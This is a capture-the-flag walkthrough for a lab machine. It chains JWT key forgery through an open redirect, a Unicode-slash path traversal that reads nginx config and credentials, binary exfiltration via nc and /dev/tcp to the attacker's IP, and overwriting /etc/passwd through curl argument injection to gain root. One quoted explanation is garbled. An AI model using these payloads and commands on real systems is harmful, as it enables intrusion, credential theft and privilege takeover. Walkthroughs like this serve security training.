```
The machine begins with the enumeration of a webserver. Upon registering a new account on the webserver a *JWK cookie* is used to authenticate the current session.
Inspecting the JWK cookie reveals that it is signed through a jwks.json stored on the server.

There is an *open redirect* in `http://10.10.11.126/redirect?url=`. 

### Exploit vulnerabilities
Combining the findings so far an attacker could use the `jkt_tool` to generate a new couple of private and public keys, and use the open redirect to alocate in his domain a new jwks.json.

Replacing the authentication cookie with the newly crafted in [jwt.io](https://jwt.io) the server will request to the attacker machine for the jwks.json.

Once you're in dashboard page there is an heavily filtered LFI endpoint. To bypass the filtration a *HostSplit* attack can be userd since the webserver converts Unicode characters back to ASCII: 
> HostSplit vulnerability: the redirect logic for this endpoint only checked that the redirect URL ended with ".dropbox.com" this redirect would be accepted, but if a user browsed to this page with Edge, the browser would follow the redirect to https://evil.ca/c.dropbox.com instead of https://evil.ca/c.dropbox.com.

```
http://10.10.11.126/display/?page=..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fnginx%ef%bc%8fsites-available%ef%bc%8fdefault
```

Enumerating the local file system there is an db.yaml with credentials in /etc/nginx/sites-available/default. Check this file and use this credentials to create a ssh conection.

### Privilege Scalation
Look for privilege: sudo -l.
> (ALL)/(ALL) /usr/bin/treport as sudo

Examine how it works. An attacker can get the Python compiled binary and extract the source code.
1. (attacker): `nc -lvnp 443 > treport`
2. (victim): `cat < /usr/bin/treport > /dev/tcp/{tu\_ip}/443/treport`

Get the md5sum of the file to check if there was any problem.

The attacker is able extract the source code using [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) utility. Then use [pycdc](https://github.com/zrax/pycdc).

Reviewing the source code the attacker is able to spot a filtering bypass to inject command arguments to a `curl` call. 

The attacker can change the root password if he could change the /etc/passwd file. Download the passwd file of the victim's machine and change the 'x' value to an des(unix) format. Generate one of them with openssl:
> root:KW25kt7gvYupk:0:0:root:/root:/bin/bash

Use {your\_ip/passwd,-o,/etc/passwd} as input of the execution of treport.

Finally access to `su root` and use the password you have changed
